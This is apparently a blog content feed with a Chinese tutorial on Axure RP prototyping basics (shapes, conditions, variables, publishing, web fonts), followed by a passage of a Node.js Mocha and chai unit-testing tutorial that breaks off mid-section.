<h2 id="基础16-设置鼠标移入元件时的提示"><a href="#基础16-设置鼠标移入元件时的提示" class="headerlink" title="基础16. 设置鼠标移入元件时的提示"></a>基础16. 设置鼠标移入元件时的提示</h2><p>在文本框属性中{元件提示}中输入提示内容即可。（图1-17）<br><img src="https://mfaying.github.io/images/axure/17.jpg" alt="avatar"><br>特别提醒：此效果要悬停一秒钟以上。并且注意这个基础内容的标题，就是一个在鼠标右下方出现的文字提示，只是有些浏览器的样式看上去像是个按钮。</p>
<h2 id="基础17-设置矩形为其他形状"><a href="#基础17-设置矩形为其他形状" class="headerlink" title="基础17. 设置矩形为其他形状"></a>基础17. 设置矩形为其他形状</h2><p>在画布中点击矩形右上方圆点图标即可打开形状列表，设置为其它形状。（图1-18）<br><img src="https://mfaying.github.io/images/axure/18.jpg" alt="avatar"></p>
<h2 id="基础18-设置自定义形状"><a href="#基础18-设置自定义形状" class="headerlink" title="基础18. 设置自定义形状"></a>基础18. 设置自定义形状</h2><p>在形状上点击&lt;鼠标右键&gt;，在菜单中选择【转换为自定义形状】，即可对形状进行编辑。也可以通过点击形状右上角的圆点图标，在打开的形状选择列表中选择【转换为自定义形状】（图1-18）。具体的编辑操作见图1-19中的标注。<br><img src="https://mfaying.github.io/images/axure/19.jpg" alt="avatar"></p>
<h2 id="基础19-设置形状水平-垂直翻转"><a href="#基础19-设置形状水平-垂直翻转" class="headerlink" title="基础19. 设置形状水平/垂直翻转"></a>基础19. 设置形状水平/垂直翻转</h2><p>在形状的属性中可以对形状进行【水平翻转】和【垂直翻转】的操作。（图1-20）<br><img src="https://mfaying.github.io/images/axure/20.jpg" alt="avatar"></p>
<h2 id="基础20-设置列表框的内容"><a href="#基础20-设置列表框的内容" class="headerlink" title="基础20. 设置列表框的内容"></a>基础20. 设置列表框的内容</h2><p>下拉列表框与列表框都可以设置内容-列表项。可以通过【属性】-【列表项】的选项来设置，也可以通过鼠标双击元件进行设置。（图1-21）<br><img src="https://mfaying.github.io/images/axure/21.jpg" alt="avatar"></p>
<h2 id="基础21-设置元件默认选中-禁用"><a href="#基础21-设置元件默认选中-禁用" class="headerlink" title="基础21. 设置元件默认选中/禁用"></a>基础21. 设置元件默认选中/禁用</h2><p>元件的属性中可以对一些元件的默认状态进行设置，可以设置的状态包括【选中】和【禁用】，默认状态的设置，可以触发属性中设置的交互样式。比如设置某个元件在浏览器中默认为禁用的灰色，就需要勾选【禁用】（复选框），并设置【禁用】的交互样式。（图1-22）</p>
<p>除了禁用与选中个别元件还具有【只读】的设置。例如：文本框与多行文本框。<br><img src="https://mfaying.github.io/images/axure/22.jpg" alt="avatar"></p>
<h2 id="基础22-设置单选按钮唯一选中"><a href="#基础22-设置单选按钮唯一选中" class="headerlink" title="基础22. 设置单选按钮唯一选中"></a>基础22. 设置单选按钮唯一选中</h2><p>全选所有的单选按钮，在元件属性中{设置单选按钮组名称}，即可实现唯一选中的效果。（图1-23）<br><img src="https://mfaying.github.io/images/axure/23.jpg" alt="avatar"></p>
<h2 id="基础23-设置元件不同状态的交互样式"><a href="#基础23-设置元件不同状态的交互样式" class="headerlink" title="基础23. 设置元件不同状态的交互样式"></a>基础23. 设置元件不同状态的交互样式</h2><p>点击元件属性中各个交互样式的名称，即可设置元件在不同状态时呈现的样式。这些样式在交互被触发时，就会显示出来。（图1-24）比如设置元件默认状态为禁用，在浏览原型时，页面打开后就会显示该元件被禁用的样式。（图1-22）<br><img src="https://mfaying.github.io/images/axure/24.jpg" alt="avatar"></p>
<h2 id="基础24-设置图片文本"><a href="#基础24-设置图片文本" class="headerlink" title="基础24. 设置图片文本"></a>基础24. 设置图片文本</h2><p>设置图片文本需要在图片上点击&lt;鼠标右键&gt;，选择【编辑文本】，方可进行图片上的文字编辑。（图1-25）<br><img src="https://mfaying.github.io/images/axure/25.jpg" alt="avatar"></p>
<h2 id="基础25-切割-裁剪图片"><a href="#基础25-切割-裁剪图片" class="headerlink" title="基础25.   切割/裁剪图片"></a>基础25.   切割/裁剪图片</h2><p>在图片的元件属性中，设有切割和裁剪功能的图标，点击即可使用相应功能。元件上点击&lt;鼠标右键&gt;，菜单中也有相应的选项。（图1-26）</p>
<p>切割：可将图片进行水平与垂直的切割，将图片分割开。</p>
<p>裁剪：可将图片中的某一部分取出。裁剪分为几种，分别是裁剪、剪切、和复制。其中：裁剪只保留被选择的区域；剪切是将选取的部分从原图中剪切到系统剪贴板中；复制是将选取的部分复制到系统剪贴板中，复制的方式对原图没有影响。<br><img src="https://mfaying.github.io/images/axure/26.jpg" alt="avatar"></p>
<h2 id="基础26-嵌入多媒体文件-页面"><a href="#基础26-嵌入多媒体文件-页面" class="headerlink" title="基础26. 嵌入多媒体文件/页面"></a>基础26. 嵌入多媒体文件/页面</h2><p>基本元件中的内联框架可以插入多媒体文件与网页。双击元件或者在属性中点击【框架目标页面】，在弹出的界面中选择【链接到url或文件】，填写{超链接}，内容为多媒体文件的地址（网络地址或文件路径）或网页地址。在这个界面中也可以选择嵌入原型中的某个页面。（图1-27）<br><img src="https://mfaying.github.io/images/axure/27.jpg" alt="avatar"></p>
<h2 id="基础27-调整元件的层级"><a href="#基础27-调整元件的层级" class="headerlink" title="基础27. 调整元件的层级"></a>基础27. 调整元件的层级</h2><p>元件的层级可以通过点击快捷功能中的图标或者右键菜单的【顺序】选项进行调整，也可以在页面内容概要中通过拖动进行调整。概要中层级顺序为由上至下，最底部的元件为最顶层。（图1-28）<br><img src="https://mfaying.github.io/images/axure/28.jpg" alt="avatar"></p>
<h2 id="基础28-组合-取消组合元件"><a href="#基础28-组合-取消组合元件" class="headerlink" title="基础28. 组合/取消组合元件"></a>基础28. 组合/取消组合元件</h2><p>通过快捷功能图标或右键菜单可以将多个元件组合到一起，达到共同移动/选取/添加交互等操作。组合/取消组合的快捷键为&lt; Ctrl+G&gt;键/&lt;Ctrl+Shift+G&gt;键。（图1-29）<br><img src="https://mfaying.github.io/images/axure/29.jpg" alt="avatar"></p>
<h2 id="基础29-转换元件为图片"><a href="#基础29-转换元件为图片" class="headerlink" title="基础29. 转换元件为图片"></a>基础29. 转换元件为图片</h2><p>形状/文本标签/线段等元件可以通过点击&lt;鼠标右键&gt;，选择将元件【转换为图片】。例如，使用少量特殊字体或者图标字体时，即可将元件转换为图片，避免在未安装字体的设备上浏览原型时不能正常显示。（图1-30）<br><img src="https://mfaying.github.io/images/axure/30.jpg" alt="avatar"></p>
<h2 id="基础30-载入元件库"><a href="#基础30-载入元件库" class="headerlink" title="基础30. 载入元件库"></a>基础30. 载入元件库</h2><p>除了使用软件自带的默认元件库与流程图元件库，用户还可以加载自定义元件库。加载自定义元件库只需点击功能图标，在列表中选择【载入元件库】。（图1-31）<br><img src="https://mfaying.github.io/images/axure/31.jpg" alt="avatar"></p>
<h2 id="基础31-切换元件库"><a href="#基础31-切换元件库" class="headerlink" title="基础31.   切换元件库"></a>基础31.   切换元件库</h2><p>在元件库功能面板中，可以通过点击元件库列表，选择不同的元件库进行使用。（图1-32）<br><img src="https://mfaying.github.io/images/axure/32.jpg" alt="avatar"></p>
<h1 id="第2章-页面设置"><a href="#第2章-页面设置" class="headerlink" title="第2章 页面设置"></a>第2章 页面设置</h1><h2 id="基础32-设置页面居中"><a href="#基础32-设置页面居中" class="headerlink" title="基础32. 设置页面居中"></a>基础32. 设置页面居中</h2><p>在页面【样式】设置中选择页面居中的按钮。页面居中是指在浏览器中查看原型时页面内容居中显示。（图2-1）<br><img src="https://mfaying.github.io/images/axure/33.jpg" alt="avatar"></p>
<h2 id="基础33-设置页面背景（图片-颜色）"><a href="#基础33-设置页面背景（图片-颜色）" class="headerlink" title="基础33. 设置页面背景（图片/颜色）"></a>基础33. 设置页面背景（图片/颜色）</h2><p>在页面【样式】中可以编辑页面的背景颜色以及背景图片。（图2-2）<br><img src="https://mfaying.github.io/images/axure/34.jpg" alt="avatar"></p>
<h2 id="基础34-设置页面颜色（草图-黑白）"><a href="#基础34-设置页面颜色（草图-黑白）" class="headerlink" title="基础34.   设置页面颜色（草图/黑白）"></a>基础34.   设置页面颜色（草图/黑白）</h2><p>在页面的【样式】中，可以将当前页面的显示为草图效果，同时可以将页面颜色在彩色与黑白之间转换。（图2-3）<br><img src="https://mfaying.github.io/images/axure/35.jpg" alt="avatar"></p>
<h1 id="第3章-设置条件"><a href="#第3章-设置条件" class="headerlink" title="第3章    设置条件"></a>第3章    设置条件</h1><h2 id="基础35-添加条件判断"><a href="#基础35-添加条件判断" class="headerlink" title="基础35.   添加条件判断"></a>基础35.   添加条件判断</h2><p>在用例编辑界面中点击添加【条件按钮】进行添加条件。（图3-1）<br><img src="https://mfaying.github.io/images/axure/36.jpg" alt="avatar"><br>比如：判断当前元件上的文字包含“@”。（图3-2）<br><img src="https://mfaying.github.io/images/axure/37.jpg" alt="avatar"></p>
<h2 id="基础36-设置条件逻辑关系"><a href="#基础36-设置条件逻辑关系" class="headerlink" title="基础36.   设置条件逻辑关系"></a>基础36.   设置条件逻辑关系</h2><p>设置执行一个动作必须同时满足多个条件，或者仅需满足多个条件中的任何一个，需要在添加条件的界面中进行设置。（图3-3）<br><img src="https://mfaying.github.io/images/axure/38.jpg" alt="avatar"></p>
<h2 id="基础37-用例条件转换"><a href="#基础37-用例条件转换" class="headerlink" title="基础37.   用例条件转换"></a>基础37.   用例条件转换</h2><p>为多个用例改变条件判断关系时，只需要在相应的用例名称上点击&lt;鼠标右键&gt;，选择【切换为<if>或<else if>】。（图3-4）<br><img src="https://mfaying.github.io/images/axure/39.jpg" alt="avatar"></else></if></p>
<h1 id="第4章-使用变量-公式"><a href="#第4章-使用变量-公式" class="headerlink" title="第4章    使用变量/公式"></a>第4章    使用变量/公式</h1><h2 id="基础38-全局变量设置"><a href="#基础38-全局变量设置" class="headerlink" title="基础38.   全局变量设置"></a>基础38.   全局变量设置</h2><p>全局变量是一个数据容器，就像一个U盘，可以把需要的资料存入，随身携带，在需要的时候读取出来使用。全局变量的设置在【项目】-【全局变量】中。（图4-1）<br><img src="https://mfaying.github.io/images/axure/40.jpg" alt="avatar"></p>
<h2 id="基础39-局部变量设置"><a href="#基础39-局部变量设置" class="headerlink" title="基础39.   局部变量设置"></a>基础39.   局部变量设置</h2><p>局部变量在编辑值/文本的界面中进行创建，通过在【插入变量或函数…】列表中选取使用。</p>
<p>局部变量能够在创建时获取多种类型的数据。（图4-2）<br><img src="https://mfaying.github.io/images/axure/41.jpg" alt="avatar"></p>
<h2 id="基础40-公式的格式及类型"><a href="#基础40-公式的格式及类型" class="headerlink" title="基础40. 公式的格式及类型"></a>基础40. 公式的格式及类型</h2><p>公式在编辑值/文本的界面中进行编辑，格式为“[[公式内容]]”。公式内的内容可以进行运算，例如：“[[3<em>15]]”获取的结果为“45”；公式运算结果自动与公式外的内容连接到一起，形成一个字符串，例如：“[[3</em>15]]个”获取的“45个”。变量与函数需要在写入在公式的“[[]]”中才能够正确获取变量值或者函数运算结果。（图4-3）<br><img src="https://mfaying.github.io/images/axure/42.jpg" alt="avatar"></p>
<h1 id="第1章-功能设置"><a href="#第1章-功能设置" class="headerlink" title="第1章 功能设置"></a>第1章 功能设置</h1><h2 id="基础1-设置形状并排显示细边框"><a href="#基础1-设置形状并排显示细边框" class="headerlink" title="基础1.   设置形状并排显示细边框"></a>基础1.   设置形状并排显示细边框</h2><p>在【菜单】-【项目】的选项列表中，选择【项目设置】；在弹出的面板中进行{边界对齐}的设置。选择【边框重合】时，两个形状中间的边框为细边框；选择【边框并排】时，两个形状中间的边框为粗边框。（图5-1）<br><img src="https://mfaying.github.io/images/axure/43.jpg" alt="avatar"></p>
<h2 id="基础2-设置画布中的遮罩阴影"><a href="#基础2-设置画布中的遮罩阴影" class="headerlink" title="基础2.   设置画布中的遮罩阴影"></a>基础2.   设置画布中的遮罩阴影</h2><p>在【菜单】-【视图】-【遮罩】的选项列表中，取消相应的勾选。比如画布中隐藏的元件不显示淡黄色的阴影，则取消【隐藏对象】的勾选。（图5-2）<br><img src="https://mfaying.github.io/images/axure/44.jpg" alt="avatar"></p>
<h2 id="基础3-显示-隐藏交互与说明编号"><a href="#基础3-显示-隐藏交互与说明编号" class="headerlink" title="基础3.   显示/隐藏交互与说明编号"></a>基础3.   显示/隐藏交互与说明编号</h2><p>在【菜单】-【视图】的选项列表中，取消【显示脚注】的勾选。（图5-3）<br><img src="https://mfaying.github.io/images/axure/45.jpg" alt="avatar"></p>
<h2 id="基础4-显示-隐藏两侧的功能面板"><a href="#基础4-显示-隐藏两侧的功能面板" class="headerlink" title="基础4.   显示/隐藏两侧的功能面板"></a>基础4.   显示/隐藏两侧的功能面板</h2><p>点击快捷功能中的图标即可关闭开启相应的功能面板。（图5-4）<br><img src="https://mfaying.github.io/images/axure/46.jpg" alt="avatar"></p>
<h2 id="基础5-展开-收起-弹出-停靠-关闭功能面板"><a href="#基础5-展开-收起-弹出-停靠-关闭功能面板" class="headerlink" title="基础5.   展开/收起/弹出/停靠/关闭功能面板"></a>基础5.   展开/收起/弹出/停靠/关闭功能面板</h2><p>如果某个功能面板需要更大的操作空间，可以将其弹出或者收起其它面板。当完成操作后再进行还原。面板弹出后可将其关闭。（图5-5）<br><img src="https://mfaying.github.io/images/axure/47.jpg" alt="avatar"></p>
<h2 id="基础6-关闭-恢复功能面板"><a href="#基础6-关闭-恢复功能面板" class="headerlink" title="基础6.   关闭/恢复功能面板"></a>基础6.   关闭/恢复功能面板</h2><p>面板可以在弹出状态下点击【×】将其关闭（图5-5），也可以在【视图】-【功能区】菜单中进行关闭或开启。如果需要将功能区所有面板恢复默认。可以在【视图】中通过【重置视图】来完成。（图5-6）<br><img src="https://mfaying.github.io/images/axure/48.jpg" alt="avatar"></p>
<h2 id="基础7-文件备份与恢复"><a href="#基础7-文件备份与恢复" class="headerlink" title="基础7.   文件备份与恢复"></a>基础7.   文件备份与恢复</h2><p>开启软件的自动备份功能，可以有效的帮助我们降低因误操作、软件崩溃、断电等异常时，未保存或者损坏文件的风险。文件的备份与恢复在【文件】菜单中进行相关操作。（图5-7）<br><img src="https://mfaying.github.io/images/axure/49.jpg" alt="avatar"></p>
<h2 id="基础8-设置自适应视图"><a href="#基础8-设置自适应视图" class="headerlink" title="基础8.   设置自适应视图"></a>基础8.   设置自适应视图</h2><p>自适应视图是指编辑多种分辨率的原型，设备中查看时，系统会根据自身分辨率，自动与分辨率相适合的原型进行匹配，并显示出来。自适应视图在【项目】-【自适应视图】中进行设置。（图5-8）<br><img src="https://mfaying.github.io/images/axure/50.jpg" alt="avatar"></p>
<h1 id="第2章-查看原型"><a href="#第2章-查看原型" class="headerlink" title="第2章 查看原型"></a>第2章 查看原型</h1><h2 id="基础9-快速预览查看原型"><a href="#基础9-快速预览查看原型" class="headerlink" title="基础9. 快速预览查看原型"></a>基础9. 快速预览查看原型</h2><p>预览原型的快捷键为<f5>键。或者，点击快捷功能中的预览图标进行预览。导航菜单【发布】-【预览设置】中进行预览的设置。（图6-1）<br><img src="https://mfaying.github.io/images/axure/51.jpg" alt="avatar"></f5></p>
<h2 id="基础10-生成HTML查看原型"><a href="#基础10-生成HTML查看原型" class="headerlink" title="基础10. 生成HTML查看原型"></a>基础10. 生成HTML查看原型</h2><p>生成原型的快捷键为<f8>键。或者，点击快捷功能中的生成图标，选择【生成HTML文件】进行生成。还可以通过导航菜单【发布】-【生成HTML文件…】中进行生成。（6-2）<br><img src="https://mfaying.github.io/images/axure/52.jpg" alt="avatar"><br>生成时，需要选择保存HTML文件的文件夹。查看设置与预览设置相同。（图6-3）<br><img src="https://mfaying.github.io/images/axure/53.jpg" alt="avatar"></f8></p>
<h2 id="基础51-生成部分原型页面"><a href="#基础51-生成部分原型页面" class="headerlink" title="基础51.   生成部分原型页面"></a>基础51.   生成部分原型页面</h2><p>发布原型时，如果不需要将所有页面生成或发布，可以在生成HTML的设置中打开【页面】的设置，取消【生成所有页面】的勾选，则可以设置生成指定的页面。注意，子级页面无法单独发布，勾选子级页面时会自动勾选父级页面。如果需要单独发布子级页面，需要在页面管理面板中将子级页面的级别调整到一级页面。（图6-4）<br><img src="https://mfaying.github.io/images/axure/54.jpg" alt="avatar"></p>
<h2 id="基础52-为原型添加标志"><a href="#基础52-为原型添加标志" class="headerlink" title="基础52.   为原型添加标志"></a>基础52.   为原型添加标志</h2><p>在生成HTML的设置中有【标志】的设置，可以为原型添加图片标识或文字标题。原型发布后会显示在工具栏的页面面板中。（图6-5）<br><img src="https://mfaying.github.io/images/axure/55.jpg" alt="avatar"></p>
<h2 id="基础53-发布原型到AxShare"><a href="#基础53-发布原型到AxShare" class="headerlink" title="基础53.   发布原型到AxShare"></a>基础53.   发布原型到AxShare</h2><p>发布原型到AxShare是指将做好的原型发布到Axure官方提供的空间中，通过自动生成的网址进行访问。发布到AxShare的快捷键为<f6>键。发布到AxShare需要预先注册AxureShare账号，注册地址：<a href="https://share.axure.com/。（图6-6）" target="_blank" rel="noopener">https://share.axure.com/。（图6-6）</a><br><img src="https://mfaying.github.io/images/axure/56.jpg" alt="avatar"></f6></p>
<h2 id="发布完成后，将会自动生成一个网址。可以通过在PC或手机浏览器中打开该网址查看原型。（图6-7）"><a href="#发布完成后，将会自动生成一个网址。可以通过在PC或手机浏览器中打开该网址查看原型。（图6-7）" class="headerlink" title="发布完成后，将会自动生成一个网址。可以通过在PC或手机浏览器中打开该网址查看原型。（图6-7）"></a>发布完成后，将会自动生成一个网址。可以通过在PC或手机浏览器中打开该网址查看原型。（图6-7）</h2><p><img src="https://mfaying.github.io/images/axure/57.jpg" alt="avatar"></p>
<h2 id="基础54-重新生成当前页面"><a href="#基础54-重新生成当前页面" class="headerlink" title="基础54.   重新生成当前页面"></a>基础54.   重新生成当前页面</h2><p>修改某个页面无需将整个原型HTML文件都重新生成一遍，只需要在【发布】的选项列表中，选择【在HTML文件中重新生成当前页面】即可。（图6-8）<br><img src="https://mfaying.github.io/images/axure/58.jpg" alt="avatar"></p>
<h2 id="基础55-移动设备设置"><a href="#基础55-移动设备设置" class="headerlink" title="基础55.   移动设备设置"></a>基础55.   移动设备设置</h2><p>制作移动设备原型需要遵循规范将原型制作成标准尺寸。移动设备原型尺寸计算工具：<a href="http://www.iaxure.com/share/yxcc/（个别移动设备可能会有出入，仅供参考！）" target="_blank" rel="noopener">http://www.iaxure.com/share/yxcc/（个别移动设备可能会有出入，仅供参考！）</a></p>
<p>除了制作成标准原型尺寸，还需要在生成HTML文件配置中，进行【移动设备】的设置，让生成的HTML文件【包含视口标签】，这样才能够正常显示。（图6-9）<br><img src="https://mfaying.github.io/images/axure/59.jpg" alt="avatar"></p>
<h2 id="基础56-Web字体设置"><a href="#基础56-Web字体设置" class="headerlink" title="基础56.   Web字体设置"></a>基础56.   Web字体设置</h2><p>当原型使用一些特殊字体时，在没有安装该字体的设备上将无法正常显示。Web字体可以较好地解决这个问题。Web字体的使用包含两种方式。</p>
<p>方式一、链接“.CSS”文件（图6-10）</p>
<p>优点：设置简单。</p>
<p>缺点：需要网络以及在线CSS文件支持。</p>
<p>以FontAwesome字体为例。在Web字体设置中，点击【+】添加新的配置，勾选【链接到“.CSS”文件】选项，将该字体官方网站提供的“.CSS”文件地址填入超链接中即可。这样只要浏览原型时有网络支持，即可正常显示字体。<br><img src="https://mfaying.github.io/images/axure/60.jpg" alt="avatar"></p>
<p>图中为Fontawesome4.4.0字体的配置方法。该字体CSS文件的官方链接地址为： <a href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css" target="_blank" rel="noopener">https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css</a></p>
<p>方式二、@font-face（图6-11）</p>
<p>优点：支持本地字体与在线字体</p>
<p>缺点：设置略有复杂</p>
<p>仍以FontAwesome字体为例。新建Web字体配置后，选择【@font-face选项】并填写代码。</p>
<p>在线字体代码如下：</p>
<p>font-family:FontAwesome;</p>
<p>src:url(‘<a href="http://7xl7jg.com1.z0.glb.clouddn.com/fontawesome-webfont.ttf&#39;" target="_blank" rel="noopener">http://7xl7jg.com1.z0.glb.clouddn.com/fontawesome-webfont.ttf&#39;</a>) format(‘truetype’);</p>
<p>本地字体代码如下：</p>
<p>font-family:FontAwesome;</p>
<p>src:url(‘fontawesome-webfont.ttf ‘) format(‘truetype’);</p>
<p>注意:使用本地字体需要将字体文件（.ttf）拷贝到生成的HTML文件夹中。</p>
<p><img src="https://mfaying.github.io/images/axure/61.jpg" alt="avatar"></p>
<p>通过以上方式处理后，未安装该字体的设备中查看原型时即可正常显示字体。</p>
<p>注意：在Axure RP 8的元件库中，提供了FontAwesome图标元件库，该元件库可以直接使用，无需进行上述设置。但是，官方提供的FontAwesome图标元件库与上述元件库有很大区别，官方元件库中的图标并不是文字，而是形状。在之后的案例中，我们需要将一些图标字体放入文本编辑界面进行编辑 ，这是官方元件无法做到的。</p>
]]></content>
      <categories>
        <category>产品</category>
      </categories>
      <tags>
        <tag>axure</tag>
      </tags>
  </entry>
  <entry>
    <title>node.js测试</title>
    <url>/2019/06/06/node-js%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>测试有单元测试、基准测试、压力测试等，自己在业余的node.js项目中主要用到单元测试，兼顾开发的效率与质量。</p>
<h1 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h1><p>Mocha（发音”摩卡”）诞生于2011年，是现在最流行的JavaScript测试框架之一，在浏览器和Node环境都可以使用。</p>
<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h2><p>先安装示例库<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/ruanyf/mocha-demos.git</span><br><span class="line">$ <span class="built_in">cd</span> mocha-demos</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure></p>
<p>上面代码会在目录内部安装Mocha，为了操作的方便，请在全局环境也安装一下Mocha。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ npm install mocha -g</span><br></pre></td></tr></table></figure></p>
<h2 id="2-测试脚本的写法"><a href="#2-测试脚本的写法" class="headerlink" title="2.测试脚本的写法"></a>2.测试脚本的写法</h2><p>Mocha的作用是运行测试脚本，首先必须学会写测试脚本。所谓”测试脚本”，就是用来测试源码的脚本。</p>
<p>下面是一个加法模块add.js的代码。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// add.js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = add;</span><br></pre></td></tr></table></figure></p>
<p>要测试这个加法模块是否正确，就要写测试脚本。</p>
<p>通常，测试脚本与所要测试的源码脚本同名，但是后缀名为.test.js（表示测试）或者.spec.js（表示规格）。比如，add.js的测试脚本名字就是add.test.js。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// add.test.js</span></span><br><span class="line"><span class="keyword">var</span> add = <span class="built_in">require</span>(<span class="string">'./add.js'</span>);</span><br><span class="line"><span class="keyword">var</span> expect = <span class="built_in">require</span>(<span class="string">'chai'</span>).expect;</span><br><span class="line"></span><br><span class="line">describe(<span class="string">'加法函数的测试'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  it(<span class="string">'1 加 1 应该等于 2'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    expect(add(<span class="number">1</span>, <span class="number">1</span>)).to.be.equal(<span class="number">2</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>上面这段代码，就是测试脚本，它可以独立执行。测试脚本里面应该包括一个或多个describe块，每个describe块应该包括一个或多个it块。</p>
<p>describe块称为”测试套件”（test suite），表示一组相关的测试。它是一个函数，第一个参数是测试套件的名称（”加法函数的测试”），第二个参数是一个实际执行的函数。</p>
<p>it块称为”测试用例”（test case），表示一个单独的测试，是测试的最小单位。它也是一个函数，第一个参数是测试用例的名称（”1 加 1 应该等于 2”），第二个参数是一个实际执行的函数。</p>
<h2 id="3-断言库的用法"><a href="#3-断言库的用法" class="headerlink" title="3.断言库的用法"></a>3.断言库的用法</h2><p>上面的测试脚本里面，有一句断言。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">expect(add(<span class="number">1</span>, <span class="number">1</span>)).to.be.equal(<span class="number">2</span>);</span><br></pre></td></tr></table></figure></p>
<p>所谓”断言”，就是判断源码的实际执行结果与预期结果是否一致，如果不一致就抛出一个错误。上面这句断言的意思是，调用add(1, 1)，结果应该等于2。</p>
<p>所有的测试用例（it块）都应该含有一句或多句的断言。它是编写测试用例的关键。断言功能由断言库来实现，Mocha本身不带断言库，所以必须先引入断言库。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> expect = <span class="built_in">require</span>(<span class="string">'chai'</span>).expect;</span><br></pre></td></tr></table></figure></p>
<p>断言库有很多种，Mocha并不限制使用哪一种。上面代码引入的断言库是chai，并且指定使用它的expect断言风格。</p>
<p>expect断言的优点是很接近自然语言，下面是一些例子。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 相等或不相等</span></span><br><span class="line">expect(<span class="number">4</span> + <span class="number">5</span>).to.be.equal(<span class="number">9</span>);</span><br><span class="line">expect(<span class="number">4</span> + <span class="number">5</span>).to.be.not.equal(<span class="number">10</span>);</span><br><span class="line">expect(foo).to.be.deep.equal(&#123; <span class="attr">bar</span>: <span class="string">'baz'</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 布尔值为true</span></span><br><span class="line">expect(<span class="string">'everthing'</span>).to.be.ok;</span><br><span class="line">expect(<span class="literal">false</span>).to.not.be.ok;</span><br><span class="line"></span><br><span class="line"><span class="comment">// typeof</span></span><br><span class="line">expect(<span class="string">'test'</span>).to.be.a(<span class="string">'string'</span>);</span><br><span class="line">expect(&#123; <span class="attr">foo</span>: <span class="string">'bar'</span> &#125;).to.be.an(<span class="string">'object'</span>);</span><br><span class="line">expect(foo).to.be.an.instanceof(Foo);</span><br><span class="line"></span><br><span class="line"><span class="comment">// include</span></span><br><span class="line">expect([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]).to.include(<span class="number">2</span>);</span><br><span class="line">expect(<span class="string">'foobar'</span>).to.contain(<span class="string">'foo'</span>);</span><br><span class="line">expect(&#123; <span class="attr">foo</span>: <span class="string">'bar'</span>, <span class="attr">hello</span>: <span class="string">'universe'</span> &#125;).to.include.keys(<span class="string">'foo'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// empty</span></span><br><span class="line">expect([]).to.be.empty;</span><br><span class="line">expect(<span class="string">''</span>).to.be.empty;</span><br><span class="line">expect(&#123;&#125;).to.be.empty;</span><br><span class="line"></span><br><span class="line"><span class="comment">// match</span></span><br><span class="line">expect(<span class="string">'foobar'</span>).to.match(<span class="regexp">/^foo/</span>);</span><br></pre></td></tr></table></figure></p>
<p>基本上，expect断言的写法都是一样的。头部是expect方法，尾部是断言方法，比如equal、a/an、ok、match等。两者之间使用to或to.be连接。</p>
<p>如果expect断言不成立，就会抛出一个错误。事实上，只要不抛出错误，测试用例就算通过。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">it(<span class="string">'1 加 1 应该等于 2'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);</span><br></pre></td></tr></table></figure></p>
<p>上面的这个测试用例，内部没有任何代码，由于没有抛出了错误，所以还是会通过。</p>
<h2 id="4-Mocha的基本用法"><a href="#4-Mocha的基本用法" class="headerlink" title="4.Mocha的基本用法"></a>4.Mocha的基本用法</h2><p>有了测试脚本以后，就可以用Mocha运行它。请进入demo01子目录，执行下面的命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha add.test.js</span><br><span class="line"></span><br><span class="line">  加法函数的测试</span><br><span class="line">    ✓ 1 加 1 应该等于 2</span><br><span class="line"></span><br><span class="line">  1 passing (8ms)</span><br></pre></td></tr></table></figure></p>
<p>上面的运行结果表示，测试脚本通过了测试，一共只有1个测试用例，耗时是8毫秒。</p>
<p>mocha命令后面紧跟测试脚本的路径和文件名，可以指定多个测试脚本。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha file1 file2 file3</span><br></pre></td></tr></table></figure></p>
<p>Mocha默认运行test子目录里面的测试脚本。所以，一般都会把测试脚本放在test目录里面，然后执行mocha就不需要参数了。请进入demo02子目录，运行下面的命令。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mocha</span><br><span class="line"></span><br><span class="line">  加法函数的测试</span><br><span class="line">    ✓ 1 加 1 应该等于 2</span><br><span class="line">    ✓ 任何数加0应该等于自身</span><br><span class="line"></span><br><span class="line">  2 passing (9ms)</span><br></pre></td></tr></table></figure></p>
<p>这时可以看到，test子目录里面的测试脚本执行了。但是，你打开test子目录，会发现下面还有一个test/dir子目录，里面还有一个测试脚本multiply.test.js，并没有得到执行。原来，Mocha默认只执行test子目录下面第一层的测试用例，不会执行更下层的用例。</p>
